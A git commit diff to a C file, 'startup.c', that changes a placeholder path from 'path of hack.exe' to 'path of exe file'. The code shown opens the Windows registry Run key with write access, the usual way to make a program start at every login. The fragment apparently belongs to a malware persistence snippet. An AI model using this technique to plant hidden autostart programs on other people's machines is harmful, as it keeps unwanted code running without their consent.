d3658034e31df74fca84da72f4fbf32f2d73ed53
rocky00-a <r93231445@gmail.com>
2026-06-25 23:16:42 +0530

    Update startup.c

--- startup.c
+++ startup.c
@@ -4,7 +4,7 @@ int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
 
 
- const char* exe = "path of hack.exe";
+ const char* exe = "path of exe file";
  // startup
  LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (result == ERROR_SUCCESS) {
